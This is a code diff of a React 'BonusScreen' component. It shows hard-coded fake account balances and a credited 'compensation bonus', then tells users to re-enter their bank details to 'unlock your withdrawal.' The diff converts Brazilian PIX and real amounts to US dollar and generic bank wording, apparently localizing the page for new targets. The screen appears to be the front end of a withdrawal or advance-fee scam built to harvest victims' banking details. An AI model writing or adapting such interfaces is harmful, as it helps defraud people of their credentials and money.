@@ -42,24 +42,24 @@ const BonusScreen = ({ userName, onContinue }: BonusScreenProps) => {
 
           {/* Bonus amount */}
           <div className="w-full rounded-2xl border border-success/30 bg-success/5 p-5 mb-5">
-            <p className="text-[11px] uppercase tracking-widest text-success font-semibold mb-2">Bonus credited</p>
-            <p className="text-4xl font-bold text-success tracking-tighter">+R$ 450,00</p>
+            <p className="text-[11px] uppercase tracking-widest text-success font-semibold mb-2">Bonus Credited</p>
+            <p className="text-4xl font-bold text-success tracking-tighter">+$450.00</p>
           </div>
 
           {/* Updated balance */}
           <div className="w-full rounded-2xl border border-border/60 bg-card p-5 mb-6 space-y-3">
             <div className="flex items-center justify-between">
               <span className="text-xs text-muted-foreground">Previous balance</span>
-              <span className="text-sm font-medium line-through text-muted-foreground">R$ 4.596,00</span>
+              <span className="text-sm font-medium line-through text-muted-foreground">$2,893.27</span>
             </div>
             <div className="flex items-center justify-between">
               <span className="text-xs text-muted-foreground">Compensation bonus</span>
-              <span className="text-sm font-semibold text-success">+R$ 450,00</span>
+              <span className="text-sm font-semibold text-success">+$450.00</span>
             </div>
             <div className="h-px bg-border/40" />
             <div className="flex items-center justify-between">
               <span className="text-xs font-semibold">New balance</span>
-              <span className="text-lg font-bold">R$ 5.046,00</span>
+              <span className="text-lg font-bold">$3,343.27</span>
             </div>
           </div>
 
@@ -67,12 +67,12 @@ const BonusScreen = ({ userName, onContinue }: BonusScreenProps) => {
           <div className="flex items-center gap-2 p-3 rounded-xl bg-secondary mb-6 w-full">
             <CheckCircle className="w-4 h-4 text-success shrink-0" />
             <p className="text-xs text-muted-foreground text-left">
-              Your bonus is secured. Please enter your PIX details again on the next screen to restart verification and release your withdrawal.
+              Your bonus is secured. Please re-enter your bank details on the next screen to restart the verification process and unlock your withdrawal.
             </p>
           </div>
 
           <Button onClick={onContinue} className="w-full h-14 rounded-full text-base font-semibold">
-            Continue to verification
+            Continue to Verification
             <ArrowRight className="w-4 h-4 ml-2" />
           </Button>
         </div>
